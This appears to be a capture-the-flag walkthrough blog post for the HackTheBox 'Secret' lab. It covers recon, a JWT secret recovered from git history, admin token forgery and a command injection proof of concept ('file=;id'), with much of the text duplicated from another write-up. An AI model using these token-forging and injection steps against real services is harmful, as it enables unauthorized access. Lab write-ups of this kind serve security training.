---
layout: post
title:  "secret box from HackTheBox"
date:   2019-03-23 1:30:36 +0530
categories: Hackthebox  walkthrough 
---

## Description : To get a foothold on Secret, I’ll start with source code analysis in a Git repository to identify how authentication works and find the JWT signing secret. 
## With that secret, I’ll get access to the admin functions, one of which is vulnerable to command injection, and use this to get a shell. 
## To get to root, I’ll abuse a SUID file in two different ways. The first is to get read access to files using the open file descriptors. 
## The alternative path is to crash the program and read the content from the crashdump.

Name:

[Secret](https://www.hackthebox.eu/home/machines/profile/408)  ![Secret](/icons/box-secret.png)

Release Date:

[30 Oct 2021](https://twitter.com/hackthebox_eu/status/1506662225427243020)

Retire Date:

26 Mar 2022

OS:

Linux ![Linux](/icons/Linux.png)

Base Points:

Easy \[20\]

Rated Difficulty:

![Rated difficulty for Secret](/img/secret-diff.png)

Radar Graph:

![Radar chart for Secret](/img/secret-radar.png)

![First Blood User](/icons/first-blood-user.png)

07 mins, 30 seconds [![szymex73](https://www.hackthebox.eu/badge/image/139466)](https://www.hackthebox.eu/home/users/profile/139466)

![First Blood Root](/icons/first-blood-root.png)

26 mins, 39 seconds [![szymex73](https://www.hackthebox.eu/badge/image/139466)](https://www.hackthebox.eu/home/users/profile/139466)

Creator:

[![](https://www.hackthebox.eu/badge/image/485024)](https://www.hackthebox.eu/home/users/profile/485024)

## Recon

## nmap

nmap finds three open TCP ports, SSH (22), HTTP over NGINX (80), and HTTP Node (3000):

```bash
robot@kali:/htb/secret$ cat nmap/secret.nmap 
# Nmap 7.92 scan initiated Wed Feb 16 02:14:56 2022 as: nmap -sC -sV -oA nmap/secret 10.10.11.120
Nmap scan report for 10.10.11.120
Host is up (0.35s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 16 02:15:34 2022 -- 1 IP address (1 host up) scanned in 38.69 seconds
```

## Based on the OpenSSH version, the host is likely running Ubuntu 20.04 Focal

## Website - TCP 80
## Site

## The site is called Dumb Docs, and it’s an documentation site:

![14.png](/assets/14.png)

image-20211026115140182

## There’s a mention of using JWT tokens for authentication. There’s also a link to download the source (/download/files.zip), which I’ll grab a copy of. /docs has demos on how to do different things like create a user, register a user, etc all via various GET and POST requests:

![15.png](/assets/15.png)

## Directory Brute Force: I’ll run gobuster against the site:

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.120
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/31 17:12:08 Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 301) [Size: 183] [--> /download/]
/docs                 (Status: 200) [Size: 20720]               
/api                  (Status: 200) [Size: 93]                  
/assets               (Status: 301) [Size: 179] [--> /assets/]  
/.                    (Status: 301) [Size: 169] [--> /./]       
/API                  (Status: 200) [Size: 93]                  
/Docs                 (Status: 200) [Size: 20720]               
/DOCS                 (Status: 200) [Size: 20720]
```
## Nothing there is too interesting beyond what the documentation already showed.

#### Get Token
## Following the steps from the documentation, I’ll register and get logged in.
## I’ll try to register the admin username, but names must be six characters long:

```bash
robot@kali:/htb/secret$ curl -d '{"name":"admin","email":"blackbash0x01@secret.htb","password":"password"}' -X POST http://10.10.11.120/api/user/register -H 'Content-Type: Application/json'
"name" length must be at least 6 characters long
```

## There’s also something checking email domains, and .htb isn’t valid:
```bash
curl -d '{"name":"blackbash","email":"blackbash0x01@secret.htb","password":"password"}' -X POST http://10.10.11.120/api/user/register -H 'Content-Type: Application/json'
"email" must be a valid email
```

## I am able to register my own name:
```bash
curl -d '{"name":"blackbash","email":"blackbash0x01@secret.com","password":"password"}' -X POST http://10.10.11.120/api/user/register -H 'Content-Type: Application/json'
{"user":"blackbash"}
```
## Now the /api/user/login API returns a token:

#### Website - TCP 3000

## As far as I can tell, everything on 3000 is the same as on 80, just without NGINX. The pages all look exactly the same. The headers are slightly different:
```bash
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 12872
ETag: W/"3248-nFUp1XavqYRgAFgHenjOsSPQ/e4"
Date: Thu, 24 Mar 2022 11:26:19 GMT
```
## The difference vs port 80 is this one is missing the line:
```bash
Server: nginx/1.18.0 (Ubuntu)
```
## I suspect NGINX is just there to proxy for Express.

#### Source Analysis

### Token

## I’ll unzip the source and give it a look. Because logging in gives a JWT, I’m particularly interesting in if the signing secret is in the source. If I can access that, I can sign my own JWT as whatever user I want.

## A bit of poking around shows that index.js is the root of the application. It sets up the application and imports routes from various folders:

```bash
const express = require('express');
const app = express();
const mongoose = require('mongoose');
const dotenv = require('dotenv')
const privRoute = require('./routes/private')
const bodyParser = require('body-parser')

app.use(express.static('public'))
app.use('/assets', express.static(__dirname + 'public/assets'))
app.use('/download', express.static(__dirname + 'public/source'))

app.set('views', './src/views')
app.set('view engine', 'ejs')


// import routs 
const authRoute = require('./routes/auth');
const webroute = require('./src/routes/web')

dotenv.config();
//connect db 

mongoose.connect(process.env.DB_CONNECT, { useNewUrlParser: true }, () =>
    console.log("connect to db!")
);

//middle ware 
app.use(express.json());
app.use('/api/user',authRoute)
app.use('/api/', privRoute)
app.use('/', webroute)

app.listen(3000, () => console.log("server up and running"));
```
## It’s using dotenv, which loads environment variables from a .env file, which is present in the downloaded files:

```bash
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```
## Unfortunately for me, the TOKEN_SECRET just says secret (it would be in " or ' if it was an actual string)./routes/auth.js has the different functions for registration and login. The login function uses process.env.TOKEN_SECRET to sign the JWT:

```bash
router.post('/login', async  (req , res) => {

    const { error } = loginValidation(req.body)
    if (error) return res.status(400).send(error.details[0].message);

    // check if email is okay 
    const user = await User.findOne({ email: req.body.email })
    if (!user) return res.status(400).send('Email is wrong');

    // check password 
    const validPass = await bcrypt.compare(req.body.password, user.password)
    if (!validPass) return res.status(400).send('Password is wrong');


    // create jwt 
    const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
    res.header('auth-token', token).send(token);

})

```
## /routes/verifytoken.js uses it as well to verify a submitted token:
```bash
const jwt = require("jsonwebtoken");

module.exports = function (req, res, next) {
    const token = req.header("auth-token");
    if (!token) return res.status(401).send("Access Denied");

    try {
        const verified = jwt.verify(token, process.env.TOKEN_SECRET);
        req.user = verified;
        next();
    } catch (err) {
        res.status(400).send("Invalid Token");
    }
}
```
## Without the secret, not much I can do there.

#### Git

The source contains a .git directory, which means this is a Git repository, which could include history on the files in the repo. git log will show the various commits:

```bash
git log --oneline 
e297a27 (HEAD -> master) now we can view logs from server
67d8da7 removed .env for security reasons
de0a46b added /downloads
4e55472 removed swap
3a367e7 added downloads
55fe756 first commit
```
## “remove .env for security reasons” is certainly interesting. git show (docs) will show the difference between the current commit and the previous:
 
```bash
 git show 67d8da7
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```
## The - in front of the line means that line is gone, and the + shows a new line. So this is showing that a long string was removes, and replaced with “secret”. It seems likely that I have the secret.private.js
## The private.js file has routes for admin things. /priv checks if the current token has admin privileges:

```bash
router.get('/priv', verifytoken, (req, res) => {
   // res.send(req.user)

    const userinfo = { name: req.user }

    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        res.json({
            creds:{
                role:"admin", 
                username:"theadmin",
                desc : "welcome back admin,"
            }
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```
## Admin privs are hardcoded for a user named “theadmin”.
## Using the instructions from the docs, I’ll add my token to the auth-header header and try this endpoint:
```bash
curl -s 'http://10.10.11.120/api/priv' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoiMHhkZjB4ZGYiLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.rMfMsdYkfSbl4hr1RJFwY3qWfrA3LSWVlzUON_9EW_A" | jq .
{
  "role": {
    "role": "you are normal user",
    "desc": "blackbash"
  }
}
```
## As expected, it shows I’m not an admin. /logs is also interesting:

## It only works if the username is theadmin, but then it can fetch Git logs. The problem is that this code has a command injection vulnerability in it, as it builds a string with user input and then passes it to exec.

#### Shell as dasith

### Forge JWT

## Test Token

## I got a JWT earlier, so I can use to test if this is still the secret in use on Secret. I like to use Python for this kind of thing, dropping into a Python shell by running python3. I’ll need PyJWT installed as well (pip3 install pyjwt).
First I’ll import the package and save my token in a variable named token and the secret in a variable named secret to make them easier to work with:

```bash
>>> import jwt
>>> token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoiMHhkZjB4ZGYiLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.rMfMsdYkfSbl4hr1RJFwY3qWfrA3LSWVlzUON_9EW_A'
>>> secret = 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE'
```
## Now the jwt.decode function will decode the token if the secret is right:

```bash
>>> jwt.decode(token, secret)
{'_id': '617825332c2bab0445c48461', 'name': 'blackbash', 'email': 'blackbash0x01@secret.com', 'iat': 1635264878}
```

### Create Token

## I’ll note above that jwt.decode() returns a dictionary with the various data from the JWT. I’ll save that to f, and then change the name to theadmin and use jwt.encode() to create a new token from that dictionary:

```bash
>>> f = jwt.decode(token, secret)
>>> f['name'] = 'theadmin'
>>> jwt.encode(f, secret)
b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8'
```

```bash
curl -s 'http://10.10.11.120/api/priv' -H "auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8" | jq .
{
  "creds": {
    "role": "admin",
    "username": "theadmin",
    "desc": "welcome back admin"
  }
}
```

Secret

To get a foothold on Secret, I’ll start with source code analysis in a Git repository to identify how authentication works and find the JWT signing secret. With that secret, I’ll get access to the admin functions, one of which is vulnerable to command injection, and use this to get a shell. To get to root, I’ll abuse a SUID file in two different ways. The first is to get read access to files using the open file descriptors. The alternative path is to crash the program and read the content from the crashdump.
Box Stats
Name: 	Secret Secret
Release Date: 	30 Oct 2021
Retire Date: 	26 Mar 2022
OS: 	Linux Linux
Base Points: 	Easy [20]
Rated Difficulty: 	Rated difficulty for Secret
Radar Graph: 	Radar chart for Secret
First Blood User 	07 mins, 30 seconds szymex73
First Blood Root 	26 mins, 39 seconds szymex73
Creator: 	
Recon
nmap

nmap finds three open TCP ports, SSH (22), HTTP over NGINX (80), and HTTP Node (3000):

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.120
Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-26 11:39 EDT
Nmap scan report for 10.10.11.120
Host is up (0.11s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 7.83 seconds

oxdf@hacky$ nmap -p 22,80,3000 -sCV -oA scans/nmap-tcpscripts 10.10.11.120
Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-26 11:42 EDT
Nmap scan report for 10.10.11.120
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.86 seconds

Based on the OpenSSH version, the host is likely running Ubuntu 20.04 Focal.
Website - TCP 80
Site

The site is called Dumb Docs, and it’s an documentation site:
image-20211026115140182

There’s a mention of using JWT tokens for authentication. There’s also a link to download the source (/download/files.zip), which I’ll grab a copy of.

/docs has demos on how to do different things like create a user, register a user, etc all via various GET and POST requests:
image-20211026115240975
Click for full image
Tech Stack

The response headers show it is nginx, and the JavaScript framework, Express:

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 04 Oct 2021 19:30:03 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: Express
ETag: W/"50f0-RKvUrC7mXaVbiUKK+AbBOImlNFI"
Content-Length: 20720

Directory Brute Force

I’ll run feroxbuster against the site:

oxdf@hacky$ feroxbuster -u http://10.10.11.120

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.120
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301       10l       16w      183c http://10.10.11.120/download
200        1l       12w       93c http://10.10.11.120/api
301       10l       16w      179c http://10.10.11.120/assets
200      486l     1119w    20720c http://10.10.11.120/docs
301       10l       16w      195c http://10.10.11.120/assets/plugins
301       10l       16w      185c http://10.10.11.120/assets/js
301       10l       16w      193c http://10.10.11.120/assets/images
301       10l       16w      187c http://10.10.11.120/assets/css
301       10l       16w      213c http://10.10.11.120/assets/plugins/lightbox
200        1l       12w       93c http://10.10.11.120/API
301       10l       16w      211c http://10.10.11.120/assets/images/features
200      486l     1119w    20720c http://10.10.11.120/Docs
301       10l       16w      231c http://10.10.11.120/assets/plugins/lightbox/examples
301       10l       16w      223c http://10.10.11.120/assets/plugins/lightbox/dist
200       21l      170w     1079c http://10.10.11.120/assets/plugins/lightbox/LICENSE
200        1l       12w       93c http://10.10.11.120/Api
200      486l     1119w    20720c http://10.10.11.120/DOCS
[####################] - 6m    269991/269991  0s      found:17      errors:1174   
[####################] - 6m     29999/29999   83/s    http://10.10.11.120
[####################] - 6m     29999/29999   73/s    http://10.10.11.120/download
[####################] - 6m     29999/29999   72/s    http://10.10.11.120/assets
[####################] - 6m     29999/29999   73/s    http://10.10.11.120/assets/plugins
[####################] - 6m     29999/29999   73/s    http://10.10.11.120/assets/images
[####################] - 6m     29999/29999   73/s    http://10.10.11.120/assets/css
[####################] - 6m     29999/29999   73/s    http://10.10.11.120/assets/js
[####################] - 6m     29999/29999   74/s    http://10.10.11.120/assets/plugins/lightbox
[####################] - 6m     29999/29999   74/s    http://10.10.11.120/assets/images/features

Nothing there is too interesting beyond what the documentation already showed.
Get Token

Following the steps from the documentation, I’ll register and get logged in.

I’ll try to register the admin username, but names must be six characters long:

oxdf@hacky$ curl -d '{"name":"admin","email":"dfdfdfdf@secret.htb","password":"password"}' -X POST http://10.10.11.120/api/user/register -H 'Content-Type: Application/json'
"name" length must be at least 6 characters long

There’s also something checking email domains, and .htb isn’t valid:

oxdf@hacky$ curl -d '{"name":"0xdf0xdf","email":"dfdfdfdf@secret.htb","password":"password"}' -X POST http://10.10.11.120/api/user/register -H 'Content-Type: Application/json'
"email" must be a valid email

I am able to register my own name:

oxdf@hacky$ curl -d '{"name":"0xdf0xdf","email":"dfdfdfdf@secret.com","password":"password"}' -X POST http://10.10.11.120/api/user/register -H 'Content-Type: Application/json'
{"user":"0xdf0xdf"}

Now the /api/user/login API returns a token:

oxdf@hacky$ curl -d '{"email":"dfdfdfdf@secret.com","password":"password"}' -X POST http://10.10.11.120/api/user/login -H 'Content-Type: Application/json'
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoiMHhkZjB4ZGYiLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.rMfMsdYkfSbl4hr1RJFwY3qWfrA3LSWVlzUON_9EW_A

Website - TCP 3000

As far as I can tell, everything on 3000 is the same as on 80, just without NGINX. The pages all look exactly the same. The headers are slightly different:

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 12872
ETag: W/"3248-nFUp1XavqYRgAFgHenjOsSPQ/e4"
Date: Thu, 24 Mar 2022 11:26:19 GMT

The difference vs port 80 is this one is missing the line:

Server: nginx/1.18.0 (Ubuntu)

I suspect NGINX is just there to proxy for Express.
Source Analysis
Token

I’ll unzip the source and give it a look. Because logging in gives a JWT, I’m particularly interesting in if the signing secret is in the source. If I can access that, I can sign my own JWT as whatever user I want.

A bit of poking around shows that index.js is the root of the application. It sets up the application and imports routes from various folders:

const express = require('express');
const app = express();
const mongoose = require('mongoose');
const dotenv = require('dotenv')
const privRoute = require('./routes/private')
const bodyParser = require('body-parser')

app.use(express.static('public'))
app.use('/assets', express.static(__dirname + 'public/assets'))
app.use('/download', express.static(__dirname + 'public/source'))

app.set('views', './src/views')
app.set('view engine', 'ejs')


// import routs 
const authRoute = require('./routes/auth');
const webroute = require('./src/routes/web')

dotenv.config();
//connect db 

mongoose.connect(process.env.DB_CONNECT, { useNewUrlParser: true }, () =>
    console.log("connect to db!")
);

//middle ware 
app.use(express.json());
app.use('/api/user',authRoute)
app.use('/api/', privRoute)
app.use('/', webroute)

app.listen(3000, () => console.log("server up and running"));

It’s using dotenv, which loads environment variables from a .env file, which is present in the downloaded files:

DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret

Unfortunately for me, the TOKEN_SECRET just says secret (it would be in " or ' if it was an actual string).

/routes/auth.js has the different functions for registration and login. The login function uses process.env.TOKEN_SECRET to sign the JWT:

router.post('/login', async  (req , res) => {

    const { error } = loginValidation(req.body)
    if (error) return res.status(400).send(error.details[0].message);

    // check if email is okay 
    const user = await User.findOne({ email: req.body.email })
    if (!user) return res.status(400).send('Email is wrong');

    // check password 
    const validPass = await bcrypt.compare(req.body.password, user.password)
    if (!validPass) return res.status(400).send('Password is wrong');


    // create jwt 
    const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
    res.header('auth-token', token).send(token);

})

/routes/verifytoken.js uses it as well to verify a submitted token:

const jwt = require("jsonwebtoken");

module.exports = function (req, res, next) {
    const token = req.header("auth-token");
    if (!token) return res.status(401).send("Access Denied");

    try {
        const verified = jwt.verify(token, process.env.TOKEN_SECRET);
        req.user = verified;
        next();
    } catch (err) {
        res.status(400).send("Invalid Token");
    }
}

Without the secret, not much I can do there.
Git

The source contains a .git directory, which means this is a Git repository, which could include history on the files in the repo. git log will show the various commits:

oxdf@hacky$ git log --oneline 
e297a27 (HEAD -> master) now we can view logs from server 😃
67d8da7 removed .env for security reasons
de0a46b added /downloads
4e55472 removed swap
3a367e7 added downloads
55fe756 first commit

“remove .env for security reasons” is certainly interesting. git show (docs) will show the difference between the current commit and the previous:

oxdf@hacky$ git show 67d8da7
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret

The - in front of the line means that line is gone, and the + shows a new line. So this is showing that a long string was removes, and replaced with “secret”. It seems likely that I have the secret.
private.js

The private.js file has routes for admin things. /priv checks if the current token has admin privileges:

router.get('/priv', verifytoken, (req, res) => {
   // res.send(req.user)

    const userinfo = { name: req.user }

    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        res.json({
            creds:{
                role:"admin", 
                username:"theadmin",
                desc : "welcome back admin,"
            }
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})

Admin privs are hardcoded for a user named “theadmin”.

Using the instructions from the docs, I’ll add my token to the auth-header header and try this endpoint:

oxdf@hacky$ curl -s 'http://10.10.11.120/api/priv' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoiMHhkZjB4ZGYiLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.rMfMsdYkfSbl4hr1RJFwY3qWfrA3LSWVlzUON_9EW_A" | jq .
{
  "role": {
    "role": "you are normal user",
    "desc": "0xdf0xdf"
  }
}

As expected, it shows I’m not an admin.

/logs is also interesting:

router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})

It only works if the username is theadmin, but then it can fetch Git logs. The problem is that this code has a command injection vulnerability in it, as it builds a string with user input and then passes it to exec.
Shell as dasith
Forge JWT
Test Token

I got a JWT earlier, so I can use to test if this is still the secret in use on Secret. I like to use Python for this kind of thing, dropping into a Python shell by running python3. I’ll need PyJWT installed as well (pip3 install pyjwt).

First I’ll import the package and save my token in a variable named token and the secret in a variable named secret to make them easier to work with:

>>> import jwt
>>> token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoiMHhkZjB4ZGYiLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.rMfMsdYkfSbl4hr1RJFwY3qWfrA3LSWVlzUON_9EW_A'
>>> secret = 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE'

Now the jwt.decode function will decode the token if the secret is right:

>>> jwt.decode(token, secret)
{'_id': '617825332c2bab0445c48462', 'name': '0xdf0xdf', 'email': 'dfdfdfdf@secret.com', 'iat': 1635263828}

To show this only works if the secret is correct, I’ll change the last character of secret from “M” to “m” and try again. It throws an InvalidSignatureError exception:

>>> jwt.decode(token, secret[:-1]+'m')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/home/oxdf/.local/lib/python3.9/site-packages/jwt/api_jwt.py", line 119, in decode
    decoded = self.decode_complete(jwt, key, algorithms, options, **kwargs)
  File "/home/oxdf/.local/lib/python3.9/site-packages/jwt/api_jwt.py", line 90, in decode_complete
    decoded = api_jws.decode_complete(
  File "/home/oxdf/.local/lib/python3.9/site-packages/jwt/api_jws.py", line 149, in decode_complete
    self._verify_signature(signing_input, header, signature, key, algorithms)
  File "/home/oxdf/.local/lib/python3.9/site-packages/jwt/api_jws.py", line 236, in _verify_signature
    raise InvalidSignatureError("Signature verification failed")
jwt.exceptions.InvalidSignatureError: Signature verification failed

That means the secret is good!
Create Token

I’ll note above that jwt.decode() returns a dictionary with the various data from the JWT. I’ll save that to j, and then change the name to theadmin and use jwt.encode() to create a new token from that dictionary:

>>> j = jwt.decode(token, secret)
>>> j['name'] = 'theadmin'
>>> jwt.encode(j, secret)
b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8'

/api/priv confirms that this token has the admin role:

oxdf@hacky$ curl -s 'http://10.10.11.120/api/priv' -H "auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8" | jq .
{
  "creds": {
    "role": "admin",
    "username": "theadmin",
    "desc": "welcome back admin"
  }
}

#### Command Injection
### Theory

## The code that I suspect will be vulnerable to command injection is:
```bash
if (name == 'theadmin'){
    const getLogs = `git log --oneline ${file}`;
    exec(getLogs, (err , output) =>{
        if(err){
            res.status(500).send(err);
            return
        }
        res.json(output);
    })
}

```

## exec is a dangerous command, as it will execute the given string. ${file} is passed in as a parameter to /api/logs. With control over ${file}, I can make getLogs into something like:

```bash
git log --oneline; [any command]
```

### POC - id

## Given that the output comes back (the command injection is not blind), I can test other commands as well, like id:
```bash
curl -s 'http://10.10.11.120/api/logs?file=;id' -H "auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8" | jq -r . uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
```
### Shell

## I’ll continue to use curl, but rather than putting the GET parameters right into the url, I’ll use -G to force a GET request, and --data-urlencode to have curl encode the data for me. Now I don’t have to worry about special characters, etc. I’ll start with a command I know works to make sure my syntax is correct:

```code
curl -s -G 'http://10.10.11.120/api/logs' \
> --data-urlencode 'file=/dev/null;id' \
> -H "auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8" \
> | jq -r .
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
```
## Adding /dev/null before the ; is not necessary, but it makes the git log command return nothing, so the output is just from my injection.
